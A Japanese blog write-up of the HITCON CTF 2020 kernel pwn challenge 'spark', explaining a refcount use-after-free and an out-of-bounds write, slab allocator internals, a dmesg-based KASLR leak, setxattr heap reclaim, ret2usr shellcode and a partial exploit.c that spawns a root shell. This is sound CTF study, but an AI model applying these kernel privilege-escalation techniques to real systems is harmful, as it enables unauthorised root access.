# [blog] spark - HITCON 2020: 10solves

この世で13番目に嫌いなことは、やり過ぎなinline化。
どうも、ニートです。

# イントロ
いつぞや開催された**HITCON CTF 2020**。そのpwn問題である**spark**の記録。最近はブログを書くモチベとCTFをするモチベがどちらも停滞してきている。このままではレモンと思い、ここ1週間はkernel pwn強化月間としている。自分自身kernelのことは全然わからないメロンのため同じところをぐるぐるしてやる気が崩壊してしまうこともあるが、プイプイモルカーの気持ちを考えながら何とかやっている。
本問題は割と典型っぽいkernelヒープのUAF問題ではあると思うのだが、スラブアロケタの知識が曖昧だったため非常に手こずってしまいスイカになった。1.5年前ならばTSGの諸先輩方に気楽に質問をすることができたのだが、最近解くような問題は2・3分で全体像が分かるようなものは少ないため、質問される側の負担を考えるとなかなか質問しにくいという状況である。よって何らかのドキュメントなり資料なりを検索することになるが、言ってることが大まかすぎたり問題の設定にあってなかったりでこれまた参考にならないことが多い。結局の所、ソースを一から読むに越したことはないというごく当たり前の事実に帰着し、りんごになった。
尚、最終的なPoCは[@c0m0r1](https://twitter.com/c0m0r1)の[PoC](https://github.com/c0m0r1/CTF-Writeup/blob/master/hitcon2020/spark/exploit.c)を参考にしている。参考にしていると言うか、もうほとんどなぞっているだけである。オリジナルが見たい方はリンクを辿ってください。

# 問題概要
## 配布物
```dist.sh
spark.ko: LKM. 
$ file ./spark.ko
./spark.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=31e7889f4046c74466bd2bc4f13a7f18a7e2a8e1, not stripped
$ modinfo ./spark.ko
filename:       /home/wataru/Documents/ctf/hitcon2020/spark/work/./spark.ko
license:        GPL
author:         david942j @ 217
srcversion:     982767236753E40E8EA6141
depends:
retpoline:      Y
intree:         Y
name:           spark
vermagic:       5.9.11 SMP mod_unload

run.sh: QEMU run script.
  -append "console=ttyS0 kaslr panic=1" \
SMEP/SMAPは無効 KPTI無効 シングルコア

initramfs.cpio.gz: absolutely normal image

demo.c: demo program using the LKM.

bzImage: kernel image.
$ cat /proc/version
Linux version 5.9.11 (david942j@217-x) (gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0, GNU ld (GNU Binutils for Ubuntu) 2.30) #1 SMP Thu Nov 26 16:29:45 CST 2020
```
案の定ソースコードなんて配ってくれないため、自前kernelを使うことができず、debuginfoなしでやるしかない。

## モジュール
結構リバースがめんどくさかった。
`/dev/node`というmiscデバイスを追加し、openするごとにノードを作成する。作成したノードは互いに重み付きリンクを張ることができる。リンクを貼ったノードによってグラフを作成し、ioctlで指定したノード間の距離をダイクストラ法によって算出して結果を返してくれるモジュールである。
```node-fops.sh
pwndbg> p *((struct miscdevice*)0xffffffffc0004000)->fops
$3 = {
  owner = 0xffffffffc0004080,
  llseek = 0xffffffff812e8a90 <ext4_resize_fs+2480>,
  read = 0x0 <fixed_percpu_data>,
  write = 0x0 <fixed_percpu_data>,
  read_iter = 0x0 <fixed_percpu_data>,
  write_iter = 0x0 <fixed_percpu_data>,
  iopoll = 0x0 <fixed_percpu_data>,
  iterate = 0x0 <fixed_percpu_data>,
  iterate_shared = 0x0 <fixed_percpu_data>,
  poll = 0x0 <fixed_percpu_data>,
  unlocked_ioctl = 0xffffffffc0002050,
  compat_ioctl = 0x0 <fixed_percpu_data>,
  mmap = 0x0 <fixed_percpu_data>,
  mmap_supported_flags = 0,
  open = 0xffffffffc0002020,
  flush = 0x0 <fixed_percpu_data>,
  release = 0xffffffffc0002000,
  fsync = 0x0 <fixed_percpu_data>,
  fasync = 0x0 <fixed_percpu_data>,
  lock = 0x0 <fixed_percpu_data>,
  sendpage = 0x0 <fixed_percpu_data>,
  get_unmapped_area = 0x0 <fixed_percpu_data>,
  check_flags = 0x0 <fixed_percpu_data>,
  flock = 0x0 <fixed_percpu_data>,
  splice_write = 0x0 <fixed_percpu_data>,
  splice_read = 0x0 <fixed_percpu_data>,
  setlease = 0x0 <fixed_percpu_data>,
  fallocate = 0x0 <fixed_percpu_data>,
  show_fdinfo = 0x0 <fixed_percpu_data>,
  copy_file_range = 0x0 <fixed_percpu_data>,
  remap_file_range = 0x0 <fixed_percpu_data>,
  fadvise = 0x0 <fixed_percpu_data>
}
```

## 構造体
モジュールで利用する構造体のうち重要なものは以下のとおり。
```structure.c
struct edge{
  struct edge *next_edge;
  struct edge *prev_edge;
  struct node_struct *node_to;
  ulong weight;
};

struct node_info{
  ulong cur_edge_idx;
  ulong capacity;
  struct node_struct **nodes;
};

struct node_struct{
  ulong index;
  long refcnt;
  char mutex_state[0x20];
  ulong is_finalized;
  char mutex_nb[0x20];
  ulong num_edge;
  struct edge *prev_edge;
  struct edge *next_edge;
  ulong finalized_idx;
  struct node_info *info;
};
```
`node_struct`構造体は、`/dev/node`をopenするごとに`kmem_cache_alloc_trace()`で確保される0x80サイズのノード実体である。各ノードは`edge`構造体のリストを持っており、これがノード間のリンクを表現する。ノードに対しては`ioctl(finalize)`という操作が可能であり、これによってそのノードを始点として深さ優先探索をすることでグラフを作成する。探索された順が`node_struct.finalized_idx`であり、各ノードは`node_struct.info->nodes`に格納される。


# Vulns
2つのバグがある。
## refcntのインクリメント忘れ
`node_struct.refcnt`によってそのノードを参照しているオブジェクト数を管理している。`refcnt`が1であるときに`close`をすると、そのノードから生えている全ての`edge`と`node`自身を`kfree()`で解放する。
```spark_node_put.c
  if (refcnt == 1) {
    info = node->info;
                    /* free info */
    if (info != (node_info *)0x0) {
      uVar4 = 1;
      if (1 < (ulong)info->cur_edge_idx) {
        do {
          refcnt = refcnt + 1;
          spark_node_put(info->nodes[uVar4]);
          uVar4 = SEXT48(refcnt);
        } while (uVar4 < (ulong)info->cur_edge_idx);
      }
      kfree(info->nodes);
    }
    peVar3 = node->prev_edge->next_edge;
    peVar2 = node->prev_edge;
    while (peVar1 = peVar3, peVar2 != (edge *)&node->prev_edge) {
                    /* free all edges */
      kfree(peVar2);
      peVar3 = peVar1->next_edge;
      peVar2 = peVar1;
    }
                    /* free node */
    kfree(node);
    return;
  }
```
だが、`refcnt`のインクリメントがノードの作成時のみ行われ、**リンクの作成時には行われていない**。
```spark_node_link.c
undefined4 spark_node_link(node_struct *node1,node_struct *node2)

{
  undefined4 uVar1;
                    /* node1.index should be less than node2.index */
  if (node1->index < node2->index) {
    mutex_lock(node2->mutex_state);
    mutex_lock(node1->mutex_state);
    uVar1 = 0xffffffea;
    if ((*(int *)&node1->is_finalized == 0) && (*(int *)&node2->is_finalized == 0)) {
      spark_node_push(node1,node2);
      spark_node_push(node2,node1);
      uVar1 = 0;
    }
    mutex_unlock(node1->mutex_state);
    mutex_unlock(node2->mutex_state);
    return uVar1;
  }
  return 0xffffffea;
}
```

このため、ノードをcloseするとそのノードを参照しているedgeが存在しているのにノードが`kfree()`されてしまう。リンクされていたノードからはそのリンクを辿れてしまうため、既に`kfree()`されたオブジェクトに対するfloating pointer(dungling pointerっていうのかな)が存在することになる。kernel heap UAFである。

## ダイクストラにおけるOOB
グラフを作成(*finalize*)し、そのグラフを利用してノード間の距離を算出する際に、各ノードの暫定最短距離を保存するのに`distance` arrayを確保している。普通のダイクストラのように始点ノードからBFSで`distance`を更新していく。この際`distance`に対するアクセスは`node_struct.finalized_idx`をインデックスとして利用している。
```spark_graph_query.c
    do {
                    /* この0xFFFFF...は取り敢えずダイクストラしたことのtmpマーカーかな */
      *cur_distance_p = 0xffffffffffffffff;
      next_edge_p = cur_node_p->prev_edge;
                    /* 結局list_for_each_entry()をやっている */
      while ((edge *)&cur_node_p->prev_edge != next_edge_p
                    /* 幅優先探索 */) {
        known_distance = distances[next_edge_p->node_to->finalized_idx];
                    /* もし探索済みでなく、より最短経路であれば更新 */
        if ((known_distance != 0xffffffffffffffff) && (uVar4 = next_edge_p->weight + counter, uVar4 < known_distance)) {
          /*** VULN!! : OOB ***/
          distances[next_edge_p->node_to->finalized_idx] = uVar4;
        }
        next_edge_p = next_edge_p->next_edge;
      }
      cur_distance_p = cur_distance;
      ppnVar3 = a;
      if (num_max_nodes != 0) {
        iVar2 = 0;
        known_distance = 0x7fffffffffffffff;
        uVar4 = 0;
        counter = start;
        do {
          uVar1 = distances[uVar4];
          if ((uVar1 < known_distance) && (uVar1 != 0xffffffffffffffff)) {
            counter = uVar4;
            known_distance = uVar1;
          }
          iVar2 = iVar2 + 1;
          uVar4 = SEXT48(iVar2);
        } while (uVar4 < num_max_nodes);
        if (end_idx == counter) goto LAB_0010097c;
        cur_distance_p = distances + counter;
        ppnVar3 = nodes + counter;
      }
      counter = *cur_distance_p;
      cur_node_p = *ppnVar3;
    } while ((counter & 0x7fffffffffffffff) != 0x7fffffffffffffff);
```

`distances[next_edge_p->node_to->finalized_idx] = uVar4;`で`distance`の更新を行っている。一見問題なさそうだが、**あるノードに繋がっているノードの中身は、vuln1のUAFを用いて任意に変更することができる**。よって、`node_struct.finalized_idx`が不正な値に書き換えられていた場合、このインデックスのバウンドチェックがないためOOB(W)が成立する。

# KASLR bypass/leak
本問題はSMEP/SMAPが無効のためRIPが取れれば終わりである。まずはexploitに必要なkernstack及び`node_struct`が入るkernheapのleakをする。尚、`node_struct`は0x80サイズのため`kmalloc-128`スラブキャッシュによって管理される。
leak自体は簡単で、vuln1のUAFを使った後に該当ノードを利用する操作をすれば**GeneralProtectionFault**(以降 **#GPF** と呼ぶ)が起きる。今回起動パラメタに`oops=panic`がないため、単にエラーメッセージを吐いてユーザプロセスが死ぬだけで済む。
![](https://i.imgur.com/Xyv0X2C.png)

#GPFが起きた原因は`0x922dd3f2227448b8`というnon-canonicalなアドレスに対するアクセスである。この値はfreeされたノード中のポインタに該当し、これdereferenceしたことによって#GPFが発生する。`0x922dd3f2227448b8`という値は、恐らくだがスラブ内のオブジェクトの`freelist`における次のオブジェクトへのポインタであると考えられる。というのも、今回のkernelは`CONFIG_SLAB_HARDEN`オプションが有効化されており、`freelist`内のポインタが`kmalloc_caches[0][7].random ^ kasan_reset_tag()`とのXORによってobfuscatedされている(glibcのtcacheにしても、考えることは同じだなぁ、みつお。)。さらに、`kmalloc-128`において`offset`メンバが`0x40`になっているため、各オブジェクトの先頭から`0x40`にこのXORされたポインタが置かれることになる。
![](https://i.imgur.com/1Y7Ru2U.png)

とうことで、この難読化されたポインタを`node_struct`のメンバとしてdereferenceすることによって#GPFが発生したものと思われる。ちゃんと確かめてはないから、知らんけど。
この#GPFによるエラーログを`dmesg`するか`/var/log/kern.log`を見ることでRSPからkernstackを、$R11からノードオブジェクトのアドレス(kernheap)をleakできる。

## 最近のdmesgについて
最近のUbuntuでは`dmesg`なりでリングバッファを読むことが制限されているらし
い。`adm` groupに入っていればOKらしいから通常ユーザであれば問題ないだろうが、CTFの問題だとどうなんやろ。まぁUbuntu標準であってkernel標準じゃないからいいのかな。詳しいことは[どこか](https://www.phoronix.com/scan.php?page=news_item&px=Ubuntu-20.10-Restrict-dmesg)を参照のこと。

# UAFされてるノードを取ってきたい
さて、ここまでで諸々のleakが早くも完了しているため、一番要であるUAFされたノードのforgeを行う。これを行うためには、`setxattr()`によってUAFされたノードオブジェクトをピンポイントで取得してくる必要がある。
正直なところ、スラブアロケタの知識が未熟未熟メロメロみかんであり、いまいちどうやるべきか分からなかったため、ここで最初に挙げたPoCをカンニングした。
そこでは、**目的のノードを取得する前に0x12回同じサイズのオブジェクトを取得していた**。恥ずかしい話、僕は`kfree()`したオブジェクトは`kmem_cache.cpu_slab->freelist`の先頭に繋がるんだから、この0x12回の取得なんてせずにすぐに`setxattr()`を呼べばUAF対象のノードを取得できるだろうと思っていた。

## スラブアロケタについて
ここで、スラブアロケタについてお勉強し直した。SLUBかと思ったらSLABについて説明している資料を見て頭がこんがらがったり、詳解Linuxを読んで古すぎね？と思ったりした。結局は[ネットの日本語資料](http://www.coins.tsukuba.ac.jp/~yas/classes/os2-2009/2010-01-26/index.html)を若干チラ見しつつ、デバフォ付きのkernelとソースコードでひたすらデバッグして大凡全体像は掴めたつもりでいる。ここでスラブアロケタについての解説をしようとも思ったが、まじで[この資料](http://www.coins.tsukuba.ac.jp/~yas/classes/os2-2009/2010-01-26/index.html)の出来が良すぎてこれ以上のものなんてできやしない+時間の無駄だと思ったため、全体の解説は行わない。

ただ、ざっくりとした概要と気になるところだけ少しメモしておく。
kernelはバディシステムからページごとに領域を確保する。バディアロケタはページ単位でしか領域を確保できないため、これを細かく分割して利用・管理するためのシステムが**スラブアロケタ**である。**スラブキャッシュ**はオブジェクトの種類・若しくはサイズごとに分かれている。よく使う構造体(`struct cred`など)は専用のキャッシュが用意されているし、それ以外の構造体についてはブート時に確保されるキャッシュ(`kmalloc-xxx`)が利用される。後者は`kmalloc_caches`配列にスラブキャッシュへのポインタが確保されており、サイズごと且つ種類(`GFP_KERNEL`とか)ごとにインデックス付けされている。
スラブキャッシュはCPU毎のスラブとNUMAノードごとのスラブ(複数)を持っている。NUMAはCPU・メモリブロック・両者を繋ぐメモリバスをひと単位とするノードを複数持つシステムであるが、正直よく分かっていないし、普通のパソコンでは恐らく以下の通りnode==1であるため、実質スラブはCPUに紐付けられたものが一つとそれ以外のスラブリストが一つと考えておいて良いと思う。
```numa.sh
$ numactl --hardware
available: 1 nodes (0)
node 0 cpus: 0 1 2 3 4 5 6 7
node 0 size: 31756 MB
node 0 free: 1420 MB
node distances:
node   0
  0:  10
```
尚、今回はそもそもにシングルコア問だから尚更である。CPUに紐付けられたスラブは`freelist`をもっており、これが**オブジェクト**のリストを構成する。CPUに紐付けられていないスラブは`kmem_cache.node`配列に**ノード**という単位でポインタが格納されており、一つのノードは`kmem_cache.node.partial`にスラブ(`struct page`)のリストを保持している。各`page`は`freelist`にfreeなオブジェクトのリストを持っている。

## per-cpu-dataについて
先程から出ている**CPUに紐付けられた**というデータだが、これはGDB上で以下のように見える。
```kmalloc-128.c
$12 = {cpu_slab = 0x310e0, flags = 1073741824, min_partial = 5, size = 128, object_size = 128, reciprocal_size = {m = 1, sh1 = 1 '\001', sh2 = 6 '\006'}, offset = 64, oo = {x = 30}, max = {x = 32}, min = {
    x = 32}, allocflags = 32, refcount = 0, ctor = 0x1 <fixed_percpu_data+1>, inuse = 0, align = 0, red_left_pad = 128, name = 0x0 <fixed_percpu_data>, list = {next = 0xffffffff8235c772,
    prev = 0xffff88800f041a68}, kobj = {
    name = 0xffff88800f041868 "h\031\004\017\200\210\377\377h\027\004\017\200\210\377\377\334\306\065\202\377\377\377\377\200\031\004\017\200\210\377\377\200\027\004\017\200\210\377\377x\031\211\016\200\210\377\377`\031\211\016\200\210\377\377@\370o\202\377\377\377\377", entry = {next = 0xffffffff8235c772, prev = 0xffff88800f041a80}, parent = 0xffff88800f041880, kset = 0xffff88800e891978, ktype = 0xffff88800e891960,
    sd = 0xffffffff826ff840, kref = {refcount = {refs = {counter = 245636352}}}, state_initialized = 0, state_in_sysfs = 0, state_add_uevent_sent = 0, state_remove_uevent_sent = 0, uevent_suppress = 0},
  random = 12884901889, remote_node_defrag_ratio = 2734939157, useroffset = 3483165071, usersize = 1000, node = {0xffff88800f04e100, 0x8000000000, 0xffff88800f040e80, 0x0 <fixed_percpu_data>,
    0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x310c0, 0x40000000, 0x5 <fixed_percpu_data+5>, 0x6000000060, 0x60155555556, 0x1e00000030, 0x2a0000002a,
    0x2a <fixed_percpu_data+42>, 0x1 <fixed_percpu_data+1>, 0x0 <fixed_percpu_data>, 0x800000060, 0x0 <fixed_percpu_data>, 0xffffffff8235c6bd, 0xffff88800f041b68, 0xffff88800f041968, 0xffffffff8235c6bd,
    0xffff88800f041b80, 0xffff88800f041980, 0xffff88800e891978, 0xffff88800e891960, 0xffffffff826ff840, 0xffff88800ea42b80, 0x300000001, 0x1cc8d0a44a4c82c4, 0x3e8, 0xffff88800f043180, 0x6000000000,
    0xffff88800f040ec0, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x0 <fixed_percpu_data>, 0x310a0, 0x40000000, 0x5 <fixed_percpu_data+5>, 0x4000000040, 0x50100000001,
    0x1e00000020, 0x4000000040, 0x40, 0x1 <fixed_percpu_data+1>, 0x0 <fixed_percpu_data>, 0x4000000040, 0x0 <fixed_percpu_data>, 0xffffffff8235c753, 0xffff88800f041c68, 0xffff88800f041a68, 0xffffffff8235c753,
    0xffff88800f041c80, 0xffff88800f041a80, 0xffff88800e891978, 0xffff88800e891960, 0xffffffff826ff840, 0xffff88800ea43a00, 0x300000001, 0x6a68fa625bc24bef, 0x3e8}}

```
これは`struct kmem_cache`型の`kmalloc-128`の例であり、この内最初のメンバである`struct kmem_cache_cpu`型の`cpu_slab`がCPU毎のデータで、`0x310e0`という明らかに不自然なデータが入っている。これは勿論`x/gx 0x310e0`のように見ることはできない。
自前kernelを使っており、linux-providedなスクリプトが利用できる場合にはGDBの`$lx_per_cpu()`関数によって指定したCPU毎のデータを参照することができるが、配布されたkernelの場合にはできない。その場合には以下の手順を踏む。(もっといい方法があったら教えてください)
- `/proc/kallsyms | grep per_cpu_offset`を読む
```ex.sh
ffffffff82426900 R __per_cpu_offset
```
- `__per_cpu_offset`は、配列になっておりx番目のCPU用領域へのポインタが[x]に入っている。今回はシングルコアで動かしているため[0]だけが有効で他はみんな同じ値になっている。
```ex.sh
(gdb) x/10gx 0xffffffff82426900
0xffffffff82426900 <knl_uncore_m2pcie>: 0xffff88800f600000      0xffffffff82889000
0xffffffff82426910 <knl_uncore_m2pcie+16>:      0xffffffff82889000      0xffffffff82889000
0xffffffff82426920 <knl_uncore_m2pcie+32>:      0xffffffff82889000      0xffffffff82889000
0xffffffff82426930 <knl_uncore_m2pcie+48>:      0xffffffff82889000      0xffffffff82889000
0xffffffff82426940 <knl_uncore_m2pcie+64>:      0xffffffff82889000      0xffffffff82889000
```
- 先程のアドレス`0x310e0`に`__per_cpu_offset`から読んだアドレスを足す。
```ex.sh
(gdb) p *(struct kmem_cache_cpu*)(0xffff88800f600000+0x310e0)
$1 = {freelist = 0x0 <fixed_percpu_data>, tid = 6035, page = 0xffffea0000367e80}
```

ちゃんとCPU毎のスラブ情報が読めていることが分かる。こっから話は逸れるが少しスラブの内容を追ってみる。`freelist`が現在`0x0`になっているため、次の`kmem_cache_alloc()`で`kmem_cache.node`から空きオブジェクトのあるスラブを検索して入れ替えるであろうことが推測される。
```ex.sh
(gdb) p *(struct kmem_cache_cpu*)(0xffff88800f600000+0x310e0)
$9 = {freelist = 0xffff88800da1f800, tid = 6040, page = 0xffffea00003687c0}
```
新しいスラブがCPU専属のスラブになった。おまけで`freelist`の先を見てみる。(今回`offset`は0x40である)
```ex.sh
(gdb) p *(struct kmem_cache_cpu*)(0xffff88800f600000+0x310e0)
$9 = {freelist = 0xffff88800da1f800, tid = 6040, page = 0xffffea00003687c0}
(gdb) x/2gx 0xffff88800da1f800+0x40
0xffff88800da1f840:     0x709bc8022e2ad9ea      0x0000000000000000
```
次のポインタが`0x709bc8022e2ad9ea`になっている。これは、スラブキャッシュが保有している`random`というメンバの値でXORされたポインタである。厳密に言えば、`slab_alloc_node()`(fastpath)から呼ばれる`freelist_ptr()`において以下のように復号される。
```slub.c
static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,
				 unsigned long ptr_addr)
{
#ifdef CONFIG_SLAB_FREELIST_HARDENED
	return (void *)((unsigned long)ptr ^ s->random ^
			swab((unsigned long)kasan_reset_tag((void *)ptr_addr)));
#else
	return ptr;
#endif
}
```
`random`の値を読むのは、(configによって`kmem_cache`の中身が異なるから若干めんどいけど)スラブキャッシュ自体をみればいいだけだからそんな難しいことはない。けど、`kasan_reset_tag()`の返す値が何なのかいまいち分かってないため、未だにこのポインタの復号方法が分からないでいる。誰かご存知の方居たら教えてください...。

## 最初にkfreeされたノードは何処へ行くか
さてさて、少し前置きが長くなったが「freeしたばっかのノード(オブジェクト)がCPU専属スラブの`freelist`の根っこに繋がる」という考えは間違いであった。というのも、exploitにおいては以下のようにalloc/freeを行っている。
```exploit-alloc-free.c
  for(int i = 0; i < N; i++) {
    fd[i] = open(DEV_PATH, O_RDWR);
    assert(fd[i]);
  }

  (snipped...)
  close(fd[0]);   // vuln

  (snipped...)
  ALLOC_KMALLOC_128(0x12);
  setxattr("/home/spark", "NIRUGIRI", &fake_node0, sizeof(fake_node0), XATTR_CREATE);
```
ここで、UAFに使うノード`fd[0]`は最初のfor文の一番最初に確保され、同じforでN(==0x20)-1個の他のノードが確保される。その後で脆弱性のあるノードをclose(kfree)している。
このとき、**fd[0]を確保したスラブとfd[0]をcloseする際のCPU専属のスラブは明らかに別のページから取得されている**。というのも、`kmalloc-128`は以下のようになっている。
```slabinfo.sh
$ sudo cat /proc/slabinfo | grep ^kmalloc-128
kmalloc-128         4884   5216    128   32    1 : tunables    0    0    0 : slabdata    163    163      0
```
左から利用しているオブジェクト数・全体のオブジェクト数・オブジェクト一つのサイズ・**1スラブあたりのオブジェクト数**・1スラブあたりのページ数・(0は飛ばして)アクティブなスラブ数・全体のスラブ数である。ここで1スラブあたりのオブジェクト数は`0x20`であり、最初のfor文で0x20回ノードを確保しているため、その途中で必ずCPU専属のスラブが枯渇し、NUMAノードのスラブと入れ替わることになる。よって、その後にcloseしても、`fd[0]`が所属するスラブとその時のCPU専属スラブは別のものであり、`do_slab_free()`ではslowpathが選択されて、`cpu_slab`の`freelist`ではなく`node.partial`の`freelist`に繋がることになる。**これが直ちにsetxattrしても目的のノードを取得できない理由である**。

## 目的のノードを取得する
ということで、最初に`kfree`した`fd[0].private_data`を取得するには、CPU専属スラブを`fd[0]`をcloseした時のスラブに戻す必要がある。この時、どれだけ`kmem_cache_alloc_trace()`を呼び出せば良いのかという問題がある。というのも、kernelでは実行が切り替えられ色々なパスが実行されるため、exploitの実行中にheapが利用され、現在のheapの状況が変わってしまうと考えられるからである。
結論から言うと、今回は`kmem_cache_alloc_trace()`する回数は完全に固定値で良かった。というのも、`kmalloc-128`を使うパスにブレイクを張ってexploitを動かしたところ、このexploit以外には全く`kmalloc-128`が使われていなかった。即ち、exploitでいじった以外にheapがいじられることはなかったため、heapの状態は完全に既知としてよかった。これが何故なのかは、正直分かっていない。直感的には`kmalloc-128`を使うパスがexploitの途中で実行されてしまうような気がするが...。単にこのキャッシュが人気無いだけなのか、本問だけのなんか特殊な感じの理由があるのか。誰か知ってる方居たら教えてください...。
なにはともあれ、この前提のもとでは`fd[0]`をkfreeした時のスラブがCPU専属になり、且つ`fd[0]`が`freelist`の根っこに繋がるまで`kmalloc`を繰り返せば良い。この0x12回という回数だが、try&errorでこうなった(厳密には、上述のPoCに書いてあったからGDBで確かめたら確かにそうなっていた)。なんかすんなりと求められる方法を知っているひとが居たら(以下略。
これで`fd[0]`を取得したら、元`fd[0]`の中身を任意の値にforgeすることができる。

# ノードの偽装
これで、vuln2を利用してkernheapを始点とするOOB(W)ができる。このとき、書き込むoffsetは`node_struct.finalized_idx`によって操作でき、書き込む値はリンクの`weight`によって操作できる。そのためには始点となる`distance` arrayを既知のアドレスに取得する(kmalloc)必要がある。これも、先程までと同じ考え方ができるようにリンクするノード数を工夫して、`distance` arrayのサイズが0x80となるように工夫する。その結果、#GPFでleakしたR11がそのまま`distance` arrayのアドレスとなるようにする。

# kernel shellcode
このoverwriteは`spark_graph_query()`によって行われる。最初の#GPFでkernstackはleakしているため、この関数のスタックフレーム内のretaddrを書き換えればRIPを取ることができる。SMEP/SMAP無効のため、ユーザランドにおいておいたシェルコードで`commit_creds(prepare_kernel_cred())`をすれば終わり。この2つの関数のアドレスは、シェルコードをに飛んだ時のスタックに積んであるアドレスを利用する。
```shellcode_nirugiri.c
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}
```


# exploit
```exploit.c
/* This PoC is completely based on @c0m0r1 's one. (https://github.com/c0m0r1/CTF-Writeup/blob/master/hitcon2020/spark/exploit.c) */
/* Also, some of the code is quoted from demo.c distributed during the CTF by author @david942j. */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <poll.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>

// commands
#define SPARK_LINK 0x4008D900
#define SPARK_FINALIZE 0xD902
#define SPARK_QUERY 0xC010D903
#define SPARK_GET_INFO 0x8018D901
#define DEV_PATH "/dev/node"

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
#define N 0x20

// globals
static int fd[N];
struct pt_regs lk_regs;   // leaked regs
struct node_struct fake_node0;

const spark_graph_query_stack_offset = 0xFEB0;
/*
(gdb) p $rsp
$3 = (void *) 0xffffc900001dfea0
(gdb) set $spark_graph_query=$3
(gdb) set $leaked_sp=0xffffc900001efd50
(gdb) p/x (long)$leaked_sp - (long)$spark_graph_query
$5 = 0xfeb0
*/

#define WAIT getc(stdin);
#define ulong unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  char *argv[] = {"/bin/sh",NULL};
  char *envp[] = {NULL};
  execve("/bin/sh",argv,envp);
}
static void save_state(void) {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

static void shellcode(void){
  asm(
    "xor rdi, rdi\n"
    "mov rbx, QWORD PTR [rsp+0x50]\n"
    "sub rbx, 0x244566\n"
    "mov rcx, rbx\n"
    "call rcx\n"
    "mov rdi, rax\n"
    "sub rbx, 0x470\n"
    "call rbx\n"
    "add rsp, 0x20\n"
    "pop rbx\n"
    "pop r12\n"
    "pop r13\n"
    "pop r14\n"
    "pop r15\n"
    "pop rbp\n"
    "ret\n"
  );
}

struct spark_ioctl_query {
  int fd1;
  int fd2;
  long long distance;
};

struct edge;
struct node_info;
struct node_struct;

struct edge{
  struct edge *next_edge;
  struct edge *prev_edge;
  struct node_struct *node_to;
  ulong weight;
};

struct node_info{
  ulong cur_edge_idx;
  ulong capacity;
  struct node_struct **nodes;
};

struct node_struct{
  ulong index;
  long refcnt;
  char mutex_state[0x20];
  ulong is_finalized;
  char mutex_nb[0x20];
  ulong num_edge;
  struct edge *prev_edge;
  struct edge *next_edge;
  ulong finalized_idx;
  struct node_info *info;
};

static void _link(int fd0, int fd1, unsigned int weight) {
  assert(fd0 < fd1);
  //printf("[+] Creating link between %d and %d with weight %u\n", fd0-3, fd1-3, weight);
  assert(ioctl(fd0, SPARK_LINK, fd1 | ((unsigned long long) weight << 32)) == 0);
}

static void _query(int fd0, int fd1, int fd2) {
  struct spark_ioctl_query qry = {
    .fd1 = fd1,
    .fd2 = fd2,
  };
  assert(ioctl(fd0, SPARK_QUERY, &qry) == 0);
}

static void _finalize(int fd0) {
  int r = ioctl(fd0, SPARK_FINALIZE);
}

void invoke_gpf()
{
  printf("[+] invoking #GPF...\n");
  for (int i = 0; i < 3; i++) {
    fd[i] = open(DEV_PATH, O_RDONLY);
    assert(fd[i] >= 0);
  }
  _link(fd[0], fd[1], 1); // still, their refcnt==1
  close(fd[0]);   // node0's refcnt==0, then be kfree(), making floating-pointer
  assert(ioctl(fd[1], SPARK_FINALIZE) == 0);  // dereference invalid pointer in node0 and invoke oops, then child be killed.
}

void leak_kaslr()
{
  char buf[0x200];
  char dum[0x200];
  const char *format ="\
[    %f] RSP: 0018:%lx EFLAGS: %lx\n\
[    %f] RAX: %lx RBX: %lx RCX: %lx\n\
[    %f] RDX: %lx RSI: %lx RDI: %lx\n\
[    %f] RBP: %lx R08: %lx R09: %lx\n\
[    %f] R10: %lx R11: %lx R12: %lx\n\
[    %f] R13: %lx R14: %lx R15: %lx";
  float fs[0x10];
  printf("[+] leaking KASLR via dmesg...\n");
  system("dmesg | grep -A13 \"general protection\" | grep -A20 RSP > /tmp/dmesg_leak");
  FILE *fp = fopen("/tmp/dmesg_leak", "r");
  fscanf(fp, format, \
